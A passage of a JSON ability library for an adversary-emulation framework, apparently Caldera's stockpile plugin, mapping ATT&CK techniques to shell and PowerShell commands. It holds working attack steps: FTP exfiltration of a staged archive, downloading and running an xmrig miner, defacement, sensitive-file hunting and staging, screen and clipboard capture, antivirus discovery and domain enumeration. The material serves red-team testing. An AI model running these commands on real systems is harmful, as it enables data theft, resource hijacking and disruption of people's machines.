                }
            },
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://#{ftp.server.address}/$RemoteName\");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential(\"#{ftp.user.name}\", \"#{ftp.user.password}\");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes(\"#{host.dir.compress}\");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();\n"
                }
            }
        },
        "id__dependence__fact": [
            "d754878c-17dd-46dc-891c-a993f8a10336",
            "host.dir.compress",
            "None"
        ],
        "plugin": "stockpile"
    },
    "68235976-2404-42a8-9105-68230cfef562": {
        "description": "Downloads random meme and sets as desktop background",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1491",
            "name": "Defacement"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": ".\\Invoke-MemeKatz.ps1\n",
                    "payloads": [
                        "Invoke-MemeKatz.ps1"
                    ]
                },
                "cmd": {
                    "command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n",
                    "payloads": [
                        "Invoke-MemeKatz.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "68235976-2404-42a8-9105-68230cfef562",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "2fe2d5e6-7b06-4fc0-bf71-6966a1226731": {
        "description": "Turn a computers WIFI off",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1499",
            "name": "Endpoint Denial of Service"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./wifi.sh off\n",
                    "cleanup": "./wifi.sh on\n",
                    "payloads": [
                        "wifi.sh"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "./wifi.sh off\n",
                    "cleanup": "./wifi.sh on\n",
                    "payloads": [
                        "wifi.sh"
                    ]
                }
            },
            "windows": {
                "psh": {
                    "command": ".\\wifi.ps1 -Off\n",
                    "cleanup": ".\\wifi.ps1 -On\n",
                    "payloads": [
                        "wifi.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2fe2d5e6-7b06-4fc0-bf71-6966a1226731",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "55f9600a-756f-496b-b27f-682052dc429c": {
        "description": "Hunts for files of a certain extension and inserts a message",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1565.001",
            "name": "Data Manipulation: Stored Data Manipulation"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                    "payloads": [
                        "mission.go"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                    "payloads": [
                        "mission.go"
                    ]
                }
            },
            "windows": {
                "cmd": {
                    "command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\",
                    "payloads": [
                        "mission.go"
                    ]
                },
                "psh": {
                    "command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';",
                    "payloads": [
                        "mission.go"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "55f9600a-756f-496b-b27f-682052dc429c",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "47d08617-5ce1-424a-8cc5-c9c978ce6bf9": {
        "description": "Create a text file for the user to find",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1491",
            "name": "Defacement"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "echo \"proof that this machine was hacked.\" > message.txt\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "echo \"proof that this machine was hacked.\" > message.txt\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"
                }
            }
        },
        "id__dependence__fact": [
            "47d08617-5ce1-424a-8cc5-c9c978ce6bf9",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "46da2385-cf37-49cb-ba4b-a739c7a19de4": {
        "description": "Download and execute Monero miner (xmrig) for 1 minute",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1496",
            "name": "Resource Hijacking"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]\n",
                    "cleanup": "rm -rf ./xmrig*;\n",
                    "timeout": 120
                }
            },
            "darwin": {
                "sh": {
                    "command": "curl -OL https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-macos-x64.tar.gz;\ntar -xf xmrig-6.11.2-macos-x64.tar.gz;\nscreen -S miner -dm ./xmrig-6.11.2/xmrig;\nsleep 60s;\nkillall xmrig;\nscreen -S miner -X quit\n",
                    "cleanup": "rm -rf ./xmrig*;\n",
                    "timeout": 120
                }
            },
            "windows": {
                "psh": {
                    "command": "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;\nExpand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\\;\nStart-Process \".\\xmrig-6.11.2\\xmrig.exe\" -WindowStyle Hidden;\nStart-Sleep -Seconds 60;\nStop-Process -Name \"xmrig\"\n",
                    "cleanup": "rm ./xmrig* -r -fo;\n",
                    "timeout": 120
                }
            }
        },
        "id__dependence__fact": [
            "46da2385-cf37-49cb-ba4b-a739c7a19de4",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "702bfdd2-9947-4eda-b551-c3a1ea9a59a2": {
        "description": "System Information Gathering Script",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"
                }
            }
        },
        "id__dependence__fact": [
            "702bfdd2-9947-4eda-b551-c3a1ea9a59a2",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "30a8cf10-73dc-497c-8261-a64cc9e91505": {
        "description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n",
                    "cleanup": "rm #{host.dir.staged}.tar.gz.gpg\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n",
                    "cleanup": "rm #{host.dir.staged}.7z\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "30a8cf10-73dc-497c-8261-a64cc9e91505",
            "host.dir.staged",
            "host.dir.compress"
        ],
        "plugin": "stockpile"
    },
    "55678719-e76e-4df9-92aa-10655bbd1cf4": {
        "description": "User enumeration",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"
                }
            }
        },
        "id__dependence__fact": [
            "55678719-e76e-4df9-92aa-10655bbd1cf4",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "90c2efaa-8205-480d-8bb6-61d90dbaf81b": {
        "description": "Locate files deemed sensitive",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1005",
            "name": "Data from Local System"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.file.path",
                                "edge": "has_extension",
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.file.path",
                                "edge": "has_extension",
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.file.path",
                                "edge": "has_extension",
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
            "None",
            "host.file.path"
        ],
        "plugin": "stockpile"
    },
    "316251ed-6a28-4013-812b-ddf5b5b007f8": {
        "description": "capture the contents of the screen",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1113",
            "name": "Screen Capture"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n",
                    "cleanup": "for i in {1..5}; do /bin/rm screen-$i.png; done;",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.screenshot.png"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;\n",
                    "cleanup": "$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.screenshot.png"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "316251ed-6a28-4013-812b-ddf5b5b007f8",
            "None",
            "host.screenshot.png"
        ],
        "plugin": "stockpile"
    },
    "b007fe0c-c6b0-4fda-915c-255bbc070de2": {
        "description": "copy the contents for the clipboard and print them",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1115",
            "name": "Clipboard Data"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "pbpaste\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Get-Clipboard -raw\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "xclip -o\n"
                }
            }
        },
        "id__dependence__fact": [
            "b007fe0c-c6b0-4fda-915c-255bbc070de2",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "4e97e699-93d7-4040-b5a3-2e906a58199e": {
        "description": "copy files to staging directory",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1074.001",
            "name": "Data Staged: Local Data Staging"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"
                },
                "cmd": {
                    "command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"
                }
            }
        },
        "id__dependence__fact": [
            "4e97e699-93d7-4040-b5a3-2e906a58199e",
            "host.file.path",
            "None"
        ],
        "plugin": "stockpile"
    },
    "720a3356-eee1-4015-9135-0fc08f7eb2d5": {
        "description": "This ability will locate directories that are cloned Git repositories.",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1005",
            "name": "Data from Local System"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.git"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.git"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "720a3356-eee1-4015-9135-0fc08f7eb2d5",
            "None",
            "host.dir.git"
        ],
        "plugin": "stockpile"
    },
    "6469befa-748a-4b9c-a96d-f191fde47d89": {
        "description": "create a directory for exfil staging",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1074.001",
            "name": "Data Staged: Local Data Staging"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "mkdir -p staged && echo $PWD/staged\n",
                    "cleanup": "rm -rf staged\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "mkdir -p staged && echo $PWD/staged\n",
                    "cleanup": "rm -rf staged\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n",
                    "cleanup": "Remove-Item -Path \"staged\" -recurse\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "6469befa-748a-4b9c-a96d-f191fde47d89",
            "None",
            "host.dir.staged"
        ],
        "plugin": "stockpile"
    },
    "10fad81e-3f68-47be-83b6-fbee7711c6a9": {
        "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n",
        "tactic": "collection",
        "technique": "T1119",
        "platforms": "windows",
        "id__dependence__fact": [
            "10fad81e-3f68-47be-83b6-fbee7711c6a9",
            "None",
            "host.dir.staged"
        ],
        "plugin": "stockpile"
    },
    "cc191baa-7472-4386-a2f4-42f203f1acfd": {
        "description": "Process discovery via SysInternals pstool",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"
                }
            }
        },
        "id__dependence__fact": [
            "cc191baa-7472-4386-a2f4-42f203f1acfd",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "94f21386-9547-43c4-99df-938ab05d45ce": {
        "description": "Capture process id, executable path, pid and parent pid before writing to disk",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1047",
            "name": "WMIC"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
                }
            }
        },
        "id__dependence__fact": [
            "94f21386-9547-43c4-99df-938ab05d45ce",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "9a30740d-3aa8-4c23-8efa-d51215e8a5b9": {
        "description": "View all potential WIFI networks on host",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n",
                    "payloads": [
                        "9f639067-370a-40ba-b7ac-6f1c15d5a158"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n",
                    "payloads": [
                        "9f639067-370a-40ba-b7ac-6f1c15d5a158"
                    ]
                }
            },
            "windows": {
                "psh": {
                    "command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n",
                    "payloads": [
                        "28f9bf43-4f14-4965-9bd9-b70fd6993d8e"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "c0da588f-79f0-4263-8998-7496b1a40596": {
        "description": "Find user running agent",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "whoami",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.user.name"
                            },
                            {
                                "source": "domain.user.name"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "whoami",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.user.name"
                            },
                            {
                                "source": "domain.user.name"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "$env:username\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.user.name"
                            },
                            {
                                "source": "domain.user.name"
                            }
                        ]
                    }
                },
                "cmd": {
                    "command": "echo %username%",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.user.name"
                            },
                            {
                                "source": "domain.user.name"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "c0da588f-79f0-4263-8998-7496b1a40596",
            "None",
            "host.user.name"
        ],
        "plugin": "stockpile"
    },
    "85341c8c-4ecb-4579-8f53-43e3e91d7617": {
        "description": "Locate all active IP and FQDNs on the network",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "arp -a",
                    "parsers": {
                        "plugins.stockpile.app.parsers.ipaddr": [
                            {
                                "source": "remote.host.ip"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "arp -a",
                    "parsers": {
                        "plugins.stockpile.app.parsers.ipaddr": [
                            {
                                "source": "remote.host.ip"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,cmd": {
                    "command": "arp -a",
                    "parsers": {
                        "plugins.stockpile.app.parsers.ipaddr": [
                            {
                                "source": "remote.host.ip"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "85341c8c-4ecb-4579-8f53-43e3e91d7617",
            "None",
            "remote.host.ip"
        ],
        "plugin": "stockpile"
    },
    "2dece965-37a0-4f70-a391-0f30e3331aba": {
        "description": "Identify AV",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.antivirus": [
                            {
                                "source": "host.installed.av"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.installed.av"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "2dece965-37a0-4f70-a391-0f30e3331aba",
            "None",
            "host.installed.av"
        ],
        "plugin": "stockpile"
    },
    "b6b105b9-41dc-490b-bc5c-80d699b82ce8": {
        "description": "Find OS Version",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "[environment]::OSVersion.Version\n"
                }
            }
        },
        "id__dependence__fact": [
            "b6b105b9-41dc-490b-bc5c-80d699b82ce8",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "deeac480-5c2a-42b5-90bb-41675ee53c7e": {
        "description": "View the shares of a remote host",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "net view \\\\#{remote.host.fqdn} /all",
                    "parsers": {
                        "plugins.stockpile.app.parsers.net_view": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_share",
                                "target": "remote.host.share"
                            }
                        ]
                    }
                },
                "cmd": {
                    "command": "net view \\\\#{remote.host.fqdn} /all",
                    "parsers": {
                        "plugins.stockpile.app.parsers.net_view": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_share",
                                "target": "remote.host.share"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "deeac480-5c2a-42b5-90bb-41675ee53c7e",
            "None",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
    "e82f39e2-56f8-4f19-8376-b007f9ac5f8a": {
        "description": "Password Policy Discovery",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1201",
            "name": "Password Policy Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "pwpolicy getaccountpolicies\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "cat /etc/pam.d/common-password\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "net accounts"
                }
            }
        },
        "id__dependence__fact": [
            "e82f39e2-56f8-4f19-8376-b007f9ac5f8a",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "5a39d7ed-45c9-4a79-b581-e5fb99e24f65": {
        "description": "Identify system processes",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Get-Process"
                },
                "cmd": {
                    "command": "tasklist"
                },
                "donut_amd64": {
                    "build_target": "ProcessDump.donut",
                    "language": "csharp",
                    "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}\n"
                }
            },
            "darwin": {
                "sh": {
                    "command": "ps aux"
                }
            },
            "linux": {
                "sh": {
                    "command": "ps aux"
                }
            }
        },
        "id__dependence__fact": [
            "5a39d7ed-45c9-4a79-b581-e5fb99e24f65",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8": {
        "description": "List contents of current directory",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "ls\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "ls\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "dir\n"
                }
            }
        },
        "id__dependence__fact": [
            "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "364ea817-bbb9-4083-87dd-94b9dba45f6f": {
        "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd,psh": {
                    "command": "net user #{domain.user.name} /domain"
                }
            }
        },
        "id__dependence__fact": [
            "364ea817-bbb9-4083-87dd-94b9dba45f6f",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "6d90e6fa-9324-4eb5-93be-9f737245bd7z": {
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.netlocalgroup": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_admin",
                                "target": "domain.user.name"
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "6d90e6fa-9324-4eb5-93be-9f737245bd7z",
            "None",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
    "feaced8f-f43f-452a-9500-a5219488abb8": {
        "description": "Identify all local users",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.001",
            "name": "Account Discovery: Local Account"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "dscl . list /Users | grep -v '_'\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "Get-WmiObject -Class Win32_UserAccount\n"
                }
            }
        },
        "id__dependence__fact": [
            "feaced8f-f43f-452a-9500-a5219488abb8",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "26c8b8b5-7b5b-4de1-a128-7d37fb14f517": {
        "description": "Identify the remote domain controllers",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "command": "nltest /dsgetdc:%USERDOMAIN%\n"
                },
                "psh": {
                    "command": "nltest /dsgetdc:$env:USERDOMAIN\n"
                }
            }
        },
        "id__dependence__fact": [
            "26c8b8b5-7b5b-4de1-a128-7d37fb14f517",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "335cea7b-bec0-48c6-adfb-6066070f5f68": {
        "description": "Display information about current system processes",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "ps\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "ps\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "get-process\n"
                }
            }
        },
        "id__dependence__fact": [
            "335cea7b-bec0-48c6-adfb-6066070f5f68",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "fa4ed735-7006-4451-a578-b516f80e559f": {
        "description": "Find hostname of remote IP in domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "nslookup #{remote.host.ip}\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.reverse_nslookup": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_ip",
                                "target": "remote.host.ip"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "fa4ed735-7006-4451-a578-b516f80e559f",
            "None",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
